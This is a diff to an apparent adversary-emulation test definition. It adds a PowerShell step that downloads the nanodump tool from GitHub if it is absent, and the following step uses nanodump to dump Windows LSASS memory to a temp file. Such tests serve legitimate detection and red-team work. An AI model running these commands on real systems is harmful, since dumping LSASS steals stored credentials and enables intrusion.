@@ -18,6 +18,10 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+      inline: "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n}}\n"
+      executor: powershell
     - name: dump-lsass.exe-memory-using-nanodump
       inline: |
         PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
